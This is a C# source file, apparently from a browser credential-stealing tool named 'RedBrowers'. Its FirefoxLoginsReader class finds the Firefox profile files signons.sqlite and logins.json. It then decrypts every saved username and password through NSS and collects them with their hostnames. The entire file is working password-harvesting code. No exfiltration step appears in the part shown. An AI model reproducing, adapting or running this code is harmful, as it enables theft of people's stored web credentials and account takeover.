using RedBrowers.Helper;
using RedBrowers.Models;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using Json.Net;
using CS_SQLite3;
using System.Data;
using System.Runtime.Remoting.Messaging;

namespace RedBrowers.Browsers
{
    internal class FirefoxLoginsReader : ILoginsReader
    {
    

        public string BrowserName { get { return "Firefox"; } }
        public List<Login> ReadLogins()
        {
            string signonsFile = null;
            string loginsFile = null;
            bool signonsFound = false;
            bool loginsFound = false;
            string[] dirs = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla\\Firefox\\Profiles"));

            var logins = new List<Login>();
            if (dirs.Length == 0)
                return logins;

            foreach (string dir in dirs)
            {
                string[] files = Directory.GetFiles(dir, "signons.sqlite");
                if (files.Length > 0)
                {
                    signonsFile = files[0];
                    signonsFound = true;
                }

                // find &quot;logins.json"file
                files = Directory.GetFiles(dir, "logins.json");
                if (files.Length > 0)
                {
                    loginsFile = files[0];
                    loginsFound = true;
                }

                if (loginsFound || signonsFound)
                {
                    FFDecryptor.NSS_Init(dir);
                    break;
                }

            }

            if (signonsFound)
            {

                string loginFilecopy = Utlis.ToTempFile(signonsFile);

                SQLiteDatabase database = new SQLiteDatabase(loginFilecopy);
                string query = "SELECT encryptedUsername, encryptedPassword, hostname FROM moz_logins";
                DataTable resultantQuery = database.ExecuteQuery(query);
                foreach (DataRow row in resultantQuery.Rows) 
                {
                    string username = FFDecryptor.Decrypt((string)row["encryptedUsername"]);
                    string password = FFDecryptor.Decrypt((string)row["encryptedPassword"]);
                    logins.Add(new Login((string)row["hostname"], username, password, BrowserName));
                }
            }

            if (loginsFound)
            {
                FFLogins ffLoginData;
                using (StreamReader sr = new StreamReader(loginsFile))
                {
                    string json = sr.ReadToEnd();
                    ffLoginData = JsonNet.Deserialize<FFLogins>(json);
                }
                foreach (LoginData loginData in ffLoginData.logins)
                {
                    string username = FFDecryptor.Decrypt(loginData.encryptedUsername);
                    string password = FFDecryptor.Decrypt(loginData.encryptedPassword);
                    logins.Add(new Login(loginData.hostname , username , password, BrowserName) );
                }
            }
            return logins;
        }


    }
}
